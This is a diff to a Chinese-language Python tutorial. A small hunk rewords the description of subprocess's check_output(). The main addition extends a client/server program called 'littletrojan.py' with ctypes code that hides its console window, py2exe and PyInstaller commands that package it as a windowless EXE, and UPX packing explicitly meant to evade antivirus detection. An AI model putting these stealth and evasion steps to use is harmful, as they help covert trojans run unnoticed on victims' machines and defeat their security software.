@@ -52,7 +52,7 @@ def check_call(*popenargs, **kwargs):
 
 ```
 
-check_output() 执行程序，并返回其标准输出
+check_output() 执行程序，返回子进程向标准输出的输出结果
 
 ```
 def check_output(*popenargs, **kwargs):
@@ -196,3 +196,41 @@ if __name__ == '__main__':
         c = Client(host,port)
         c.run()
 ```
+
+在服务器运行时，希望它隐藏 console 窗体，如果在 cmd 中执行则不会隐藏
+
+```
+import ctypes
+#隐藏console窗体
+def hiding():
+   whnd = ctypes.windll.kernel32.GetConsoleWindow()
+   if whnd != 0:
+      ctypes.windll.user32.ShowWindow(whnd, 0)
+      ctypes.windll.kernel32.CloseHandle(whnd)
+```
+
+用 py2exe 打包成 EXE 文件
+
+```
+#setup.py
+from distutils.core import setup
+import py2exe
+ 
+setup(console=["littletrojan.py"])#此处为需要封装的python文件名
+```
+
+然后 
+
+```
+python setup.py py2exe
+```
+
+或者是用 pyinstaller
+
+```
+python pyinstaller.py -F -w littletrojan.py
+```
+
+最后还可以用 UPX Shell 给它加壳免杀
+
+![upxshell](images/upxshell.png)
